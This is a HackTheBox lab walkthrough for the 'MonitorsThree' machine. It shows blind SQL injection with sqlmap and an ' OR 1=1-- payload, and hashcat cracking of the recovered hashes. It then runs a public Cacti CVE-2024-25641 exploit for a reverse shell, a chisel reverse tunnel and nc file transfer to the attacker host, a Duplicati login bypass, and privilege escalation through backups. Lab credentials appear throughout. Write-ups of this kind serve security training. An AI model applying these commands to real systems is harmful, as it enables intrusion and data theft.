<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="HTB - Linux - Medium" />
<meta name="keywords" content=", linux" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/walkthroughs/monitorsthree/" />


    <title>
        
            MonitorsThree :: TheFizzyFish 
        
    </title>





<link rel="stylesheet" href="/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">



    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">



  <meta itemprop="name" content="MonitorsThree">
  <meta itemprop="description" content="HTB - Linux - Medium">
  <meta itemprop="datePublished" content="2024-08-28T20:34:25-04:00">
  <meta itemprop="dateModified" content="2024-08-28T20:34:25-04:00">
  <meta itemprop="wordCount" content="1163">
  <meta itemprop="image" content="http://localhost:1313/">
  <meta itemprop="keywords" content="Linux">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/">
  <meta name="twitter:title" content="MonitorsThree">
  <meta name="twitter:description" content="HTB - Linux - Medium">







    <meta property="article:published_time" content="2024-08-28 20:34:25 -0400 EDT" />











    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text ">
                $ cd /root/</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/common/">Common.txt</a></li><li><a href="/walkthroughs/">Walkthroughs</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://localhost:1313/walkthroughs/monitorsthree/">MonitorsThree</a></h2>

            
            
            

            <div class="post-content">
                <p>Medium rated HTB machine. Foothold involves exploiting a blind SQLi vulnerability to get the password hash for the cacti web application
hosted which has an authenticated arbitrary file write which can lead to php code execution.</p>
<p>Escalation uses the intended functions of a duplicati backup application and is fairly straightforward&hellip; access to the application is done through a authentication bypass and is a little more interesting.</p>
<h1 id="enum">Enum</h1>
<h2 id="port-scanning">Port Scanning</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/monitorsthree<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nmap -p- -T5 -oN all-ports.nmap $IP    
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65531</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE    SERVICE
</span></span><span style="display:flex;"><span>22/tcp    open     ssh
</span></span><span style="display:flex;"><span>80/tcp    open     http
</span></span><span style="display:flex;"><span>8084/tcp  filtered websnp
</span></span><span style="display:flex;"><span>11794/tcp filtered unknown
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/monitorsthree<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nmap -p22,80 -A -oN service-scan.nmap $IP  
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://monitorsthree.htb/
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>Need to add <code>monitorsthree.htb</code> to our /etc/hosts before our dir and vhost enum.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/monitorsthree<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#34;</span>$IP<span style="color:#e6db74"> monitorsthree.htb&#34;</span> | sudo tee -a /etc/hosts
</span></span></code></pre></div><h2 id="80monitorsthreehtb">80/monitorsthree.htb</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># directory enum</span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/monitorsthree<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -t <span style="color:#ae81ff">50</span> -x php -b 404,403 -o gobuster-80.out 
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>/login.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4252<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/admin                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://monitorsthree.htb/admin/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://monitorsthree.htb/images/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://monitorsthree.htb/css/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 13560<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/js                   <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://monitorsthree.htb/js/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/.                    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 13560<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/fonts                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://monitorsthree.htb/fonts/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/forgot_password.php  <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3030<span style="color:#f92672">]</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Vhost enum</span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/monitorsthree<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u $URL -H <span style="color:#e6db74">&#39;Host: FUZZ.monitorsthree.htb&#39;</span> -fs <span style="color:#ae81ff">13560</span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>cacti                   <span style="color:#f92672">[</span>Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 27ms<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>And we find a vhost - <code>cacti</code> to add to our enumeration scope and our /etc/hosts file.</p>
<p>Looking at the password recovery feature, we can enumerate the user <code>admin</code> as it gives us a different response if the user doesn&rsquo;t exist&hellip;. but we could have guessed that as a default username.</p>
<p><img src="/Screenshots/MonitorsThree_image_1.png" alt=""></p>
<p>Lets take a look at this request with burpsuite.
<img src="/Screenshots/MonitorsThree_image_2.png" alt=""></p>
<p>POST request with a username parameter. We can try running sqlmap against it since we know it is checking for valid usernames.</p>
<p>I copied the contents of the request to a file and can then easily run sqlmap against it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/monitorsthree<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ sqlmap -r forgot_pass.req 
</span></span></code></pre></div><p>While waiting for sqlmap we can check manually, with the payload <code>' OR 1=1--</code> we&rsquo;re able to get an error message &ndash; looks promising.</p>
<p><img src="/Screenshots/MonitorsThree_image_3.png" alt=""></p>
<p>SQLmap also finds the parameter vulnerable to a time-based blind query.
<img src="/Screenshots/MonitorsThree_image_4.png" alt=""></p>
<p>We can use sqlmap to dump the databases with this vulnerability but it&rsquo;s slow. With time based blind SQLi, SQLmap will test each character and relies on a delay from a successful query using the sleep() function.</p>
<p>Lets try and dump the <code>users</code> table and <code>password</code> column:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/monitorsthree<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ sqlmap -r forgot_pass.req --dump -D monitorsthree_db -T users -C password --batch
</span></span></code></pre></div><p>The second hash returned can be cracked!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/monitorsthree<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ hashcat hash.txt /usr/share/wordlists/rockyou.txt -m <span style="color:#ae81ff">0</span>  
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>31a181c8372e3afc59dab863430610e8:greencacti2001
</span></span></code></pre></div><p>And we can login to both the default subdomain application and the cactus application with <code>admin:greencacti2001</code></p>
<h3 id="cacti">Cacti</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/monitorsthree<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -t <span style="color:#ae81ff">50</span> -x php -b 404,403 -o gobuster-80-cacti.out 
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /cacti<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/app                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://cacti.monitorsthree.htb/app/<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/.                    <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; /cacti<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/cacti                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://cacti.monitorsthree.htb/cacti/<span style="color:#f92672">]</span>
</span></span></code></pre></div><p><img src="/Screenshots/MonitorsThree_image_5.png" alt=""></p>
<p>Looks interesting. Looking at the cacti forums, this version released last December
<img src="/Screenshots/MonitorsThree_image_6.png" alt=""></p>
<p>Thanks to a sql injection vulnerability in the other web app, we were able to get a password for the admin user and theres an authenticated file write vuln.
<code>admin:greencacti2001</code>.</p>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25641">https://nvd.nist.gov/vuln/detail/CVE-2024-25641</a></p>
<blockquote>
<p>Prior to version 1.2.27, an arbitrary file write vulnerability, exploitable through the &ldquo;Package Import&rdquo; feature, allows authenticated users having the &ldquo;Import Templates&rdquo; permission to execute arbitrary PHP code on the web server. The vulnerability is located within the <code>import_package()</code> function defined into the <code>/lib/import.php</code> script. The function blindly trusts the filename and file content provided within the XML data, and writes such files into the Cacti base path (or even outside, since path traversal sequences are not filtered).</p>
</blockquote>
<hr>
<h1 id="foothold">Foothold</h1>
<p>Someone else was kind enough to make an exploit for CVE-2024-25641, an arbitrary file write vuln allowing authenticated user&rsquo;s to execute php code - <a href="https://github.com/5ma1l/CVE-2024-25641">https://github.com/5ma1l/CVE-2024-25641</a></p>
<p>We need to change the values to our IP and listening port in php/monkey.php.
<img src="/Screenshots/MonitorsThree_image_7.png" alt=""></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/monitorsthree/cacti/CVE-2024-25641<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ python3 exploit.py http://cacti.monitorsthree.htb/cacti admin greencacti2001
</span></span></code></pre></div><p><img src="/Screenshots/MonitorsThree_image_8.png" alt=""></p>
<p>And we&rsquo;re on the box. Looking at home dirs, there&rsquo;s one other user besides root <code>marcus</code>.</p>
<p>Tried the password we already had but no luck switching to marcus.</p>
<p>Linpeas.sh finds an interesting process running on port 8084 <code>/usr/bin/mono /usr/lib/mono/4.5/xsp4.exe</code>
<img src="/Screenshots/MonitorsThree_image_9.png" alt=""></p>
<p><img src="/Screenshots/MonitorsThree_image_10.png" alt=""></p>
<p>Makes sense as it&rsquo;s running a .exe. This appears to be a web app running monodoc</p>
<p><img src="/Screenshots/MonitorsThree_image_11.png" alt=""></p>
<p>Another listening port on 8200. Looking at a docker-compose.yml file, it&rsquo;s a linuxserver container.</p>
<p><img src="/Screenshots/MonitorsThree_image_12.png" alt=""></p>
<p>checking out 8200, looks like it&rsquo;s running tiny webserver and is hosting a login</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@monitorsthree:/$ curl -v localhost:8200/login.html
</span></span></code></pre></div><p><img src="/Screenshots/MonitorsThree_image_13.png" alt=""></p>
<p>We can upload chisel and set up a rev port forward to check out the ports:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@monitorsthree:/dev/shm$ ./chisel client 10.10.14.7:1080 R:8200:127.0.0.1:8200
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/monitorsthree<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ./chisel_amd server --reverse --port <span style="color:#ae81ff">1080</span> 
</span></span></code></pre></div><p><img src="/Screenshots/MonitorsThree_image_14.png" alt=""></p>
<blockquote>
<p>Duplicati is a backup client that securely stores encrypted, incremental, compressed remote backups of local files on cloud storage services and remote file servers.</p>
</blockquote>
<p>Found a sqlite file with config values at <code>/opt/duplicati/config/</code>
<img src="/Screenshots/MonitorsThree_image_15.png" alt="">
Transferred the file over with nc, we can then open it with <code>sqlitebrowser</code>
Looking at the data gives us some interesting info
<img src="/Screenshots/MonitorsThree_image_16.png" alt=""></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>server-passphrase - Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>server-passphrase-salt - xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I
</span></span></code></pre></div><p>There&rsquo;s a helpful guide on how to bypass authentication with this info:
<a href="https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee">https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee</a></p>
<p>Once we&rsquo;re logged in:
<img src="/Screenshots/MonitorsThree_image_17.png" alt=""></p>
<p>At this point we could probably get root.txt flag but lets get the user first.</p>
<p>Database creds in a cacti config file</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$database_type     <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mysql&#39;</span>;
</span></span><span style="display:flex;"><span>$database_default  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;cacti&#39;</span>;
</span></span><span style="display:flex;"><span>$database_username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;cactiuser&#39;</span>;
</span></span><span style="display:flex;"><span>$database_password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;cactiuser&#39;</span>;
</span></span></code></pre></div><p>Should check in case we can get the pass for marcus.</p>
<p>We can login and check for creds:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@monitorsthree:/dev/shm$ mysql -u cactiuser -p
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[</span>cacti<span style="color:#f92672">]</span>&gt; <span style="color:#66d9ef">select</span> * from user_auth;
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK
</span></span></code></pre></div><p><img src="/Screenshots/MonitorsThree_image_18.png" alt=""></p>
<p>And we got a password hash. Moved it to a file on my attack box <code>marcus.hash</code> and ran haschat against it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/monitorsthree<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ hashcat marcus.hash /usr/share/wordlists/rockyou.txt -m <span style="color:#ae81ff">3200</span>   
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910
</span></span></code></pre></div><p>We can switch over to the marcus user using <code>su</code>, ssh needs a public key auth</p>
<p><img src="/Screenshots/MonitorsThree_image_19.png" alt=""></p>
<p>Copied over the user&rsquo;s <code>id_rsa</code> key file contents to my local host and used it to SSH to the box
<img src="/Screenshots/MonitorsThree_image_20.png" alt=""></p>
<p><img src="/Screenshots/MonitorsThree_image_21.png" alt=""></p>
<h2 id="exploits">Exploits</h2>
<p><a href="https://github.com/5ma1l/CVE-2024-25641">https://github.com/5ma1l/CVE-2024-25641</a></p>
<hr>
<h1 id="privesc">PrivEsc</h1>
<p>Since we successfully logged into the duplicati web app, we can perform a backup of the /root directory and restore it to a location we can access.</p>
<p>We need to add a new backup
<img src="/Screenshots/MonitorsThree_image_22.png" alt=""></p>
<p>backup destination <code>source/dev/shm</code>
<img src="/Screenshots/MonitorsThree_image_23.png" alt=""></p>
<p>Backup source data <code>source/root/</code></p>
<p><img src="/Screenshots/MonitorsThree_image_24.png" alt=""></p>
<p>Rest of the settings can be left as-is and submitted. We should see our new backup configuration saved and we can select run now to trigger it.</p>
<p><img src="/Screenshots/MonitorsThree_image_25.png" alt=""></p>
<p>We can then try and restore from our new backup</p>
<p><img src="/Screenshots/MonitorsThree_image_26.png" alt="">
<img src="/Screenshots/MonitorsThree_image_27.png" alt=""></p>
<p>Then choose where we want to restore them to `source/dev/shm:
<img src="/Screenshots/MonitorsThree_image_28.png" alt=""></p>
<p>Hit restore and we can check <code>/dev/shm</code> to see if we were successful.</p>
<p>And we got it.</p>
<p><img src="/Screenshots/MonitorsThree_image_29.png" alt=""></p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="http://localhost:1313/tags/linux/">linux</a></span>
        
    </p>

            
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2024</span>
            <span><a href="http://localhost:1313/"></a></span>
            <span></span>
            
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by Four Gnomes in a Hoodie</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js" integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc&#43;cxaJzDdCYbAW0X1G&#43;DgZYvtKFXe6MBex8jUJ2JT25mQx&#43;YjACIng=="></script>




    </body>
</html>
